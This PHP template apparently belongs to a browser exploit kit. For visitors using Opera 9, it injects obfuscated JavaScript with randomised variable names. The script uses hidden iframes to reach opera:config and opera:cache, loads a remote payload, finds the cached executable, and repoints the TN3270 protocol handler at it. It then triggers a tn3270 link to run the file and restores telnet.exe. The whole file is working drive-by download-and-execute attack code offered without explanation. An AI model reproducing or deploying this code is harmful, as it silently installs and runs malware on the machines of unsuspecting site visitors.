<?php
	if (eregi("Opera 9",_browser())){
?>
<script>
<?=$rnd_var[1];?> = document.createElement('iframe');
<?=$rnd_var[1];?>.src = 'about:blank';
<?=$rnd_var[1];?>.setAttribute('id', '<?=$rnd_var[2];?>');
<?=$rnd_var[1];?>.setAttribute('style', 'display:none');
document.appendChild(<?=$rnd_var[1];?>);
<?=$rnd_var[2];?>.eval
	("<?=$rnd_var[3];?> = document.createElement('iframe');\
	<?=$rnd_var[3];?>.setAttribute('id', '<?=$rnd_var[4];?>');\
	<?=$rnd_var[3];?>.src = 'opera:config';\
	document.appendChild(<?=$rnd_var[3];?>);\
	<?=$rnd_var[7];?> = document.createElement('script');\
	<?=$rnd_var[5];?> = document.createElement('iframe');\
	<?=$rnd_var[7];?>.src = '<?=$url;?>';\
	<?=$rnd_var[7];?>.onload = function ()\
	{\
		<?=$rnd_var[5];?>.src = 'opera:cache';\
		<?=$rnd_var[5];?>.onload = function ()\
		{\
			cache = <?=$rnd_var[5];?>.contentDocument.childNodes[0].innerHTML.toUpperCase();\
			var re = new RegExp('(OPR\\\\w{5}.EXE)</TD>\\\\s*<TD>\\\\d+</TD>\\\\s*<TD><A HREF=\"'+<?=$rnd_var[7];?>.src.toUpperCase(), '');\
			filename = cache.match(re);\
			<?=$rnd_var[4];?>.eval\
			(\"\
			opera.setPreference('Network','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent.filename[1]);\
			<?=$rnd_var[6];?> = document.createElement('a');\
			<?=$rnd_var[6];?>.setAttribute('href', 'tn3270://nothing');\
			<?=$rnd_var[6];?>.click();\
			setTimeout(function () {opera.setPreference('Network','TN3270 App','telnet.exe')},1000);\
			\");\
		};\
		document.appendChild(<?=$rnd_var[5];?>);\
	};\
	document.appendChild(<?=$rnd_var[7];?>);");
</script>
<?php } ?>